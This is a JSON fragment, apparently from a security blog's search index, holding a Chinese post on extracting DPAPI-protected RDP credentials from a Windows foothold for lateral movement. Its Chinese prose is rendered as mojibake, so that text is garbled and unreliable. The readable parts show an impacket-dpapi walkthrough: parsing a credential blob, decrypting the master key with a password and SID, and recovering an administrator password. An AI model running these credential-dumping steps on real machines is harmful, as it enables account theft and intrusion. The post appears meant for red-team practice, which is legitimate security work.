secrets","text":"å‰è¨€åœ¨ä¸€å° Windows æœºå™¨ä¸Šç«‹è¶³åï¼Œåˆ©ç”¨ DPAPI è·å–æœ¬åœ°å­˜å‚¨çš„å‡­æ®æ˜¯ä¸€ç§å¸¸è§ä¸”é«˜æ•ˆçš„æ¨ªå‘ç§»åŠ¨æ‰‹æ®µã€‚å°¤å…¶æ˜¯åœ¨å·¥ä½œç»„ç¯å¢ƒä¸­ï¼Œæ¯å° Windows ä¸»æœºéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ¨ªå‘ç§»åŠ¨éš¾åº¦è¾ƒå¤§ï¼Œæ­¤æ—¶å¯ä»¥å°è¯•é€šè¿‡ DPAPI è§£å¯†å‡­æ®ï¼Œè·å–æ›´å¤šæœ‰æ•ˆå‡­æ®ï¼Œä»è€Œæ‰©å¤§å†…ç½‘æ§åˆ¶èŒƒå›´ã€‚ DPAPIDPAPIï¼ˆæ•°æ®ä¿æŠ¤ APIï¼‰æ˜¯ Windows ç³»ç»Ÿçš„ä¸€ä¸ªå†…éƒ¨ç»„ä»¶ã€‚å®ƒå…è®¸å„ç§åº”ç”¨ç¨‹åºå­˜å‚¨æ•æ„Ÿæ•°æ®ã€‚è¿™äº›æ•°æ®å­˜å‚¨åœ¨ç”¨æˆ·ç›®å½•ä¸­ï¼Œå¹¶ç”±åŸºäºç”¨æˆ·å¯†ç æ´¾ç”Ÿçš„ç”¨æˆ·ä¸“ç”¨ä¸»å¯†é’¥è¿›è¡Œä¿æŠ¤; é€šä¿—çš„æ¥è§£é‡Šå°±æ˜¯ï¼šDPAPI ä¼šä¸ºæ¯ä¸ªç”¨æˆ·ç”Ÿæˆä¸€ä¸ªéšæœºçš„ Master Keyï¼ˆä¸»å¯†é’¥ï¼‰ï¼Œå®ƒæ˜¯ç”¨æ¥åŠ è§£å¯†å„ç§å‡­æ®æ–‡ä»¶ï¼ˆå¦‚æµè§ˆå™¨ä¿å­˜çš„å¯†ç ã€RDP å‡­æ®ã€Credential Manager æ¡ç›®ç­‰ï¼‰çš„æ ¸å¿ƒå¯†é’¥ã€‚ ç”±äº Master Key æœ¬èº«éå¸¸æ•æ„Ÿï¼Œç³»ç»Ÿä¼šç”¨åŸºäºç”¨æˆ·ç™»å½•å¯†ç æ´¾ç”Ÿå‡ºçš„å¯†é’¥ï¼ˆä¹Ÿå« ç”¨æˆ·åŠ å¯†å¯†é’¥ æˆ– æ´¾ç”Ÿå¯†é’¥ï¼‰å¯¹ Master Key è¿›è¡ŒåŠ å¯†ï¼Œç„¶åæŠŠå®ƒå®‰å…¨åœ°å­˜å‚¨åœ¨Master Key File çš„æ–‡ä»¶é‡Œã€‚ å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…è·å–äº†ç”¨æˆ·çš„æ˜æ–‡å¯†ç æˆ–è€… NTLM Hashï¼Œå°±èƒ½è§£é” Master Key Fileï¼Œä»è€Œæ‹¿åˆ° Master Keyï¼Œå†è¿›ä¸€æ­¥è§£å¯†å„ç§ DPAPI åŠ å¯†çš„ Windows å‡­æ®æ–‡ä»¶ï¼Œå®Œæˆæ¨ªå‘ç§»åŠ¨æˆ–æ•æ„Ÿæ•°æ®çªƒå–ã€‚ 123456master key fileå­˜æ”¾è·¯å¾„ï¼šC:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Protect\\$SIDå‡­æ®æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼šC:\\Users\\$USER\\AppData\\Local\\Microsoft\\Credentials\\C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Credentials\\ é€šè¿‡å‡­æ®ç®¡ç†å™¨æˆ–è€…ä»¥å‘½ä»¤â€cmdkey /listâ€çš„æ–¹å¼ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰æœºå™¨å­˜åœ¨çš„å‡­æ® åˆ©ç”¨åœ¨æ”»é˜²æ¼”ç»ƒä¸­ï¼Œæœ€å¸¸è§çš„åœºæ™¯ä¹‹ä¸€å°±æ˜¯å·²ç«‹è¶³çš„ Windows ä¸»æœºå­˜å‚¨äº† RDP å‡­æ®ã€‚å½“ç”¨æˆ·åœ¨ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥ï¼ˆRDPï¼‰æ—¶ï¼Œå¦‚æœå‹¾é€‰äº†â€œè®°ä½æˆ‘çš„å‡­æ®â€ï¼Œç³»ç»Ÿå°±ä¼šå°†ç™»å½•å‡­æ®ä»¥ DPAPI åŠ å¯†çš„å½¢å¼ä¿å­˜åœ¨æœ¬åœ°ã€‚ æ— è®ºæ˜¯ç”¨äºå­˜æ”¾å·²åŠ å¯†å‡­æ®çš„æ–‡ä»¶ï¼Œè¿˜æ˜¯ä¿å­˜ Master Key çš„æ–‡ä»¶ï¼Œé»˜è®¤éƒ½å±äºç³»ç»Ÿéšè—æ–‡ä»¶ã€‚åªæœ‰åœ¨èµ„æºç®¡ç†å™¨ä¸­å–æ¶ˆå‹¾é€‰â€œéšè—å—ä¿æŠ¤çš„æ“ä½œç³»ç»Ÿæ–‡ä»¶â€ï¼Œæˆ–é€šè¿‡å‘½ä»¤è¡Œä½¿ç”¨ dir /a è¿™ç±»å¸¦æœ‰æ˜¾ç¤ºéšè—æ–‡ä»¶å‚æ•°çš„å‘½ä»¤ï¼Œæ‰èƒ½çœ‹åˆ°å®ƒä»¬ã€‚ åœ¨ä¸€æ¬¡å…¸å‹çš„æ”»é˜²æ¼”ç»ƒåœºæ™¯ä¸­ï¼Œå½“å·²ç«‹è¶³çš„ Windows ä¸»æœºä¿å­˜äº†è¿œç¨‹æ¡Œé¢è¿æ¥ï¼ˆRDPï¼‰å‡­æ®æ—¶ï¼Œå¯ä»¥å€ŸåŠ© impacket-dpapi å·¥å…·ï¼Œç»“åˆç”¨æˆ·å¯†ç æˆ– NTLM Hash å¯¹ DPAPI åŠ å¯†çš„æ•°æ®è¿›è¡Œè§£å¯†ã€‚ä¸‹é¢æ¼”ç¤ºå®Œæ•´æµç¨‹ï¼š å…ˆè§£æå‡­æ®æ–‡ä»¶ï¼Œæ‰¾åˆ°æ‰€éœ€çš„ Master Key æ ‡è¯†ï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å‡­æ®æ–‡ä»¶ä½¿ç”¨çš„ Master Key GUID æ˜¯ï¼šFD75E2CC-8580-4FD9-B290-386D3873FB54 12345678910111213141516171819202122â”Œâ”€â”€(kaliã‰¿kali)-[~/dpapi]â””â”€$ impacket-dpapi credential -f C383663656F2ED9851FC1510F9E657C8 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [BLOB]Version : 1 (1)Guid Credential : DF9D8CD0-1501-11D1-8C7A-00C04FC297EBMasterKeyVersion : 1 (1)Guid MasterKey : FD75E2CC-8580-4FD9-B290-386D3873FB54Flags : 20000000 (CRYPTPROTECT_SYSTEM)Description : æœ¬åœ°å‡­æ®æ•°æ®CryptAlgo : 00006610 (26128) (CALG_AES_256)Salt : b'001767347caf4e35ce75297c1158426ace2625301743bf9c894aacbd778dfa26'HMacKey : b''HashAlgo : 0000800e (32782) (CALG_SHA_512)HMac : b'5ce37637ff014eea8cb96c5b5881deabcd741492726a14a60386133a501caf12'Data : b'4c2df9c9bd1fdc39c15c3fe9027a2f740aec257ad268cb3d006e33c855b9d53c2eae7ffe3caa287a3c581bc54f0910909dc118ec1868beeb4ac97a1e1dda710c8787ddde7a946f057779a92deece2fc6cfbac34e136af705ec2137d969893d5c4b57fb4461aba02f33140581d9be893c7b34d161799a4499ee61865eb8af4d3a4ccb00d326dc119f9e44a96ae28bf75ffdf29b5166ad3a04689f90b273cfbfd22caf612de18e4472a3c2db56739dfc836ba5dbc92c3c2412192164778631f10aa47d897e12162cf0eeb17679d323780d'Sign : b'd74ac118b63852ae33d644a820a80ed7e330eeb6fed19667e70f1c64080221998e38b177b295e2791d053b0247d64153faa00f6857ae055e1d360c3251af2a01'Cannot decrypt (specify -key or -sid whenever applicable) æœ‰äº† Master Key GUIDï¼Œå°±å»å¯¹åº”çš„ Protect\\&lt;SID&gt;\\ è·¯å¾„ä¸‹æ‰¾åˆ°è¯¥ Master Key Fileï¼Œè§£å¯†éœ€è¦æä¾›ç”¨æˆ· SID å’Œå¯†ç ï¼ˆæˆ– Hashï¼‰ï¼š 12345678910111213141516â”Œâ”€â”€(kaliã‰¿kali)-[~/dpapi]â””â”€$ impacket-dpapi masterkey -f fd75e2cc-8580-4fd9-b290-386d3873fb54 -password '123456' -sid S-1-5-21-3082292462-1319426464-2548540947-500 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE]Version : 2 (2)Guid : fd75e2cc-8580-4fd9-b290-386d3873fb54Flags : 5 (5)Policy : 0 (0)MasterKeyLen: 000000b0 (176)BackupKeyLen: 00000090 (144)CredHistLen : 00000014 (20)DomainKeyLen: 00000000 (0)Decrypted key with User Key (SHA1)Decrypted key: 0x0210397d6c3d1c2714f273e329b0f703df3936eff89a0854f32a92948a58683407f41d47e1e05f0e2a6ab921ac14d287eb6508d5bc6aca5f9999c504cc02f9d9 æœ€åä½¿ç”¨å·²è§£å¯†çš„ Master Keyï¼Œå¯¹åŸå§‹å‡­æ®æ–‡ä»¶è¿›è¡Œè§£å¯†ï¼šæˆåŠŸæ‹¿åˆ°è´¦æˆ·å¯†ç  1234567891011121314â”Œâ”€â”€(kaliã‰¿kali)-[~/dpapi]â””â”€$ impacket-dpapi credential -f C383663656F2ED9851FC1510F9E657C8 -key 0x0210397d6c3d1c2714f273e329b0f703df3936eff89a0854f32a92948a58683407f41d47e1e05f0e2a6ab921ac14d287eb6508d5bc6aca5f9999c504cc02f9d9 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL]LastWritten : 2025-06-06 07:24:21+00:00Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)Persist : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)Target : Domain:target=TERMSRV/192.168.55.136Description : Unknown : Username : administratorUnknown : whoami@pass æ›´å¤šåˆ©ç”¨æ–¹å¼è§å‚è€ƒã€‚ å‚è€ƒhttps://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#dpapi-secrets https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html","link":"/2025/07/21/DPAPI%20secrets/"}],"tags":[{"name":"HTB","slug":"HTB","link":"/tags/HTB/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"include","slug":"include","link":"/tags/include/"},{"name":"pollution","slug":"pollution","link":"/tags/pollution/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"Mysql","slug":"Mysql","link":"/tags/Mysql/"}],"categories":[]}